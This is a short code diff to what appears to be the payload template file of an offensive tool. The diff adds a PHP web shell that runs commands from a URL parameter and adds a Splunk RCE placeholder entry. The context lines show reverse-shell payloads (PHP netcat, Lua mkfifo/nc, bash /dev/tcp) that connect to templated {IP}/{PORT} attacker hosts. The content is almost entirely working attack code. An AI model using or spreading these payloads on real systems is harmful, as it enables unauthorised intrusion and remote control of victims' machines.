@@ -1717,6 +1717,11 @@ payload:
 
       {PHP_LFI}
     - |
+      # System ($_GET[0])
+      <?php system($_GET[0]); ?>
+
+      {PHP_LFI}
+    - |
       # System (nc)
       <?php system("nc {IP} {PORT} -e /bin/sh"); ?>
 
@@ -1754,4 +1759,7 @@ payload:
       os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {IP} {PORT} >/tmp/f")
     - |
       os.execute("bash -i >& /dev/tcp/{IP}/{PORT} 0>&1")
+  splunk_rce:
+    - |
+      {SPLUNK_RCE}
 """
